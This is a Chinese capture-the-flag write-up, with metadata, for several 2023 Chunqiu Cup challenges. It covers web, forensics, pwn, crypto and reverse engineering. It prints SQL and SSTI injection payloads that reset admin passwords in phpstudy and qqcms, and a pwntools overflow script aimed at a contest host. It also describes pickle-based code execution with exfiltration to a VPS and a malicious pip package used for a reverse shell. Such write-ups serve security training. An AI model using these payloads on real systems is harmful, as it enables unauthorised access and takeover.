---
title: 2023 年春秋杯–网络安全联赛春季赛部分 WP
contest: 春秋杯春季赛 2023
year: 2023
difficulty: medium
vuln_type: sqli
tags:
- phpstudy漏洞
- easypy_pickle
- BitLocker取证
- 海量PNG拼接
- 隐写术
- zsteg
- qqcms_SQL注入
- pell方程
- EC-ElGamal
- 4道RE+CRYPTO+WEB
attack_chain:
- 'Phpstudy: X-Requested-With: XMLHttpRequest 头 + SQL 注入改 admin 密码 sadmin'';UPDATE ADMINS'
- 计划任务执行 cat /f*
- 'Easypy: numpy.loads(pickle) + 过滤 R/bash/sh + base64 编码手搓 opcode'
- 取证：tcp.srcport==20 && tcp.dstport==80 拿 BitLocker 密码
- 拼接分离的 png 文件得到 password
- DiskGenius 挂载取证大师取 flag
- 盲人会藏在哪里：补文件头得压缩包密码 ChunJiSai7k7kbibi@!
- zsteg 提取 ag{ 隐藏内容
- 'p2048: 反复 t 输入溢出到后门函数'
- 'piphack: 上传恶意 python 包改 png 后缀，h->H 绕过过滤'
- 'ezrust: ./flag 当前目录即 work'
- 'qqcms: SSTI 模板注入 INSERT INTO qc_user VALUES 改密码'
- 'checkin: pell 方程 + 二项式展开'
- 'backdoor: 直接表 z 求 key'
- 'Poisoned_tea: VMP 改 UPX 脱壳 + TEA 36 轮解密'
key_payload: '''phpstudy: sadmin'';UPDATE ADMINS set PASSWORD=''c26be8aaf53b15054896983b43eb6a65'''
one_liner: 春秋杯春季赛 11 题：phpstudy 改密+pickle RCE+BitLocker 取证+海量 PNG 拼接+TEA 36 轮。
lesson: 大量 PNG 拼接用 magick montage；BitLocker 用取证大师提取恢复密钥；pickle opcode 可手搓绕过字符过滤。
quality: high
full_path: 2023年春秋杯–网络安全联赛春季赛部分WP.full.md
meta_path: 2023年春秋杯–网络安全联赛春季赛部分WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2023 年春秋杯–网络安全联赛春季赛部分 WP。春秋杯春季赛 11 题：phpstudy 改密+pickle RCE+BitLocker 取证+海量 PNG 拼接+TEA 36 轮。。关键路径：Phpstudy: X-Requested-With: XMLHttpRequest 头 + SQL 注入改 admin 密码 sadmin'';UPDATE ADMINS → 计划任务执行 cat ...'
category: misc
subcategory: misc_other
tools_used:
- Python
- zsteg
time_required: medium
difficulty_score: 3
code_blocks_count: 0
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/118391.html
reasoning_chain:
- '触发点：Phpstudy 登录界面 X-Requested-With: XMLHttpRequest 头 → 假设 SQL 注入'
- 动作：sadmin';UPDATE ADMINS set PASSWORD='c26be8aaf53b15054896983b43eb6a65' → 观察：admin/123456
- 动作：计划任务执行 cat /f* → 观察：拿到 flag
- actor Easypy numpy.loads(pickle) 过滤 R/bash/sh → 假设手搓 opcode → 动作：base64 编码
- actor 取证 tcp.srcport==20 && tcp.dstport==80 → 假设 BitLocker 密码 → 动作：取证大师恢复
- actor 海量 PNG 拼接分离 → 假设 password 提取 → 动作：拼接 password
- actor 盲人会藏在哪里补文件头 → 假设压缩包密码 ChunJiSai7k7kbibi@! → 观察：zsteg ag{
- actor pell 方程 N=1117 + 二项式展开 → actor Poisoned_tea VMP 改 UPX + TEA 36 轮
failed_attempts:
- 试图 XSS+CSRF 反弹 shell → 失败：弹不上需 SQL 注入改密
- 试图直接 pickle.loads字符串 → 失败：过滤 R/bash/sh 需手搓 opcode
key_observations:
- 大量 PNG 拼接用 magick montage
- BitLocker 用取证大师提取恢复密钥
- pickle opcode 可手搓绕过字符过滤
- VMP 字符串改 UPX 是经典脱壳绕过
prerequisites:
- Phpstudy 历史漏洞
- Python pickle opcode 手搓
- BitLocker 取证恢复
- VMP/UPX 脱壳原理
---
# 2023年春秋杯–网络安全联赛春季赛部分WP

> 原文: https://www.ctfiot.com/118391.html
> ID: 118391

Phpstudy

本来以为是XSS+CSRF反弹shell，但是一直弹不上，猜测是登陆界面sql注入放入X-Requested-With：XMLHttpRequest请头就能进入登陆界面用户名sadmin’;UPDATE ADMINS set PASSWORD =’c26be8aaf53b15054896983b43eb6a65′;–admin/123456

计划任务执行cat /f*

Easypy

Dir扫目录，有个download路由，下载源码

被删了，有个pyc反编译一下得到源码

过滤了R，sh，bash，利用点是resp = numpy.loads(numpydata)

Pickle反序列化，手搓opcode

过滤了上面这些字符，所以直接先将执行的内容存到文件里，利用vps外带

Exp如下

传参base64编码后的内容，监听即可得到flag

Phpstudy

导出http：

改为压缩包得到：

取证大师加载一下发现BitLocker解密：

根据提示找到

tcp.srcport == 20 && tcp.dstport == 80

提取出来得到：

bi-locker:
120483-350966-299189-055297-225478-133463-431684-359403

解密得：

有好多图片，取证大师试用无法一次性全部提取，发现有一个图片很大，提取出来

Foremost一下：

使用magick montage拼接一下：

猜测是password：856a-a56b6a705653

flag2:-919c-a140d7054ac5

使用AXIOM Process挂载一下：

Flag1:
f97d5b05-d312-46ac

拼接一下

flag{f97d5b05-d312-46ac-919c-a140d7054ac5}

盲人会藏在哪里

加一下文件头得到密码

ChunJiSai7k7kbibi@!

得到坤坤：

Zsteg查看一下:

发现了个ag{，提取一下看看

flag{2c8ba897-0205-9bff-123d-281d12a24c38}

p2048

from pwn import *

p = remote(‘39.106.65.236’, 29728)

p.sendline(b’t’*0x400)

p.interactive()

玩几次就会溢出偏移到后门函数

flag{3834fe18-932d-4b34-9427-57565f0a803c}

piphack

上传恶意python包

压缩之后改成png格式，然后h->H绕过过滤，监听端口pip传该地址，下载这个png

反弹到shell得到flag

flag{4661747e-c7ed-4d2e-a2ee-315243be16a8}

checkin

第一部分求解一下pell函数得到x,y

直接使用二项式展开定理即可还原flag

backdoor

可以直接将z表示出来然后就能求解key了

ezrust

审计猜测当前目录就是work

所以./得到flag

qqcms

代码审计，找到后台路由是/index/admin

有历史漏洞，直接SQL注入改密码{{loop sql=‘INSERT INTO qc_user VALUES (666, 16666666666, “管理员”, “”,

“e10adc3949ba59abbe56e057f20f883e”, “”, “”, 1, “”, 2, 0.00, 0, 1, 1652334396, “127.0.0.1”, 1, 1, 1, 1652334410,

“127.0.0.1”)’}}{{/loop}}

登陆后台后发现文件包含漏洞

得到flag

BWBA

Exp如下

Poisoned_tea_CHELL

exp如下

#flag{cdfec405-3f4b-457e-92fe-f6446098ee2e}

–天权信安网络安全团队–

网络无边 安全有界

2022，感恩有您

2023，携手同行

用技术撬动未来，用奋斗描绘成功！

–最新动态–

网络无边 安全有界

2022，感恩有您

2023，携手同行

凌泽网安

楚泽实验室介绍

AGCTF战队介绍

---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]